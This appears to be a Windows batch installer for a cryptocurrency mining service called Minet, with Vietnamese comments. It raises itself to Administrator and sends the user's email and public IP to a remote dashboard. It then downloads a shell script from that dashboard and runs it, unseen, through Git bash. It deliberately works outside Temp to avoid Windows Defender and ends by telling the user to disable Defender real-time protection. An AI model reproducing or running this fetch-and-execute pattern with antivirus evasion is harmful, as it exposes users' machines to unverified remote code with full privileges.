@echo off
setlocal enabledelayedexpansion
set BU=https://dashboard.minet.vn
set WORK_DIR=C:\Minet_Setup

:: Kiem tra quyen Admin
net session >nul 2>&1
if errorlevel 1 (
    echo [INFO] Dang yeu cau quyen Administrator...
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit /b
)

:: Tao thu muc lam viec rieng biet de tranh bi Windows Defender chan trong Temp
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
cd /d "%WORK_DIR%"

echo.
echo ===== Minet Mining Setup (Deep Fix) =====
echo.
set /p EM=Email: 
if "!EM!"=="" (echo [ERROR] Email required. & pause & exit /b 1)

echo [INFO] Dang kiem tra moi truong...

:: Lay IP
for /f "delims=" %%I in ('curl -sf https://api.ipify.org') do set CI=%%I
set EE=!EM:@=%%40!
set EE=!EE:+=%%2B!
set EE=!EE: =%%20!
set EI=!CI::=%%3A!

set SETUP_URL=!BU!/api/minecoin/setup?email=!EE!^&ip=!EI!^&mode=dashboard

:: Tim Git bash
set BASH_EXE=
if exist "C:\Program Files\Git\bin\bash.exe"       set BASH_EXE=C:\Program Files\Git\bin\bash.exe
if exist "C:\Program Files (x86)\Git\bin\bash.exe" set BASH_EXE=C:\Program Files (x86)\Git\bin\bash.exe

if "!BASH_EXE!"=="" (
    echo [ERROR] Khong tim thay Git bash.
    pause
    exit /b 1
)

:: Tai script ve thu muc WORK_DIR
curl -fsSL "!SETUP_URL!" -o "minet_setup.sh"

:: Chuyen duong dan sang dinh dang Unix
set UNIX_WORK=/c/Minet_Setup

echo [INFO] Dang chay setup voi quyen uu tien cao...

:: Chay bash va ep moi bien moi truong vao thu muc C:\Minet_Setup
"!BASH_EXE!" --login -c "export TMPDIR='%UNIX_WORK%'; export TEMP='%UNIX_WORK%'; export TMP='%UNIX_WORK%'; cd '%UNIX_WORK%'; bash './minet_setup.sh'"

:done
echo.
echo [DONE] Neu van bao loi Permission, hay tam tat Real-time Protection cua Windows Defender.
pause
endlocal
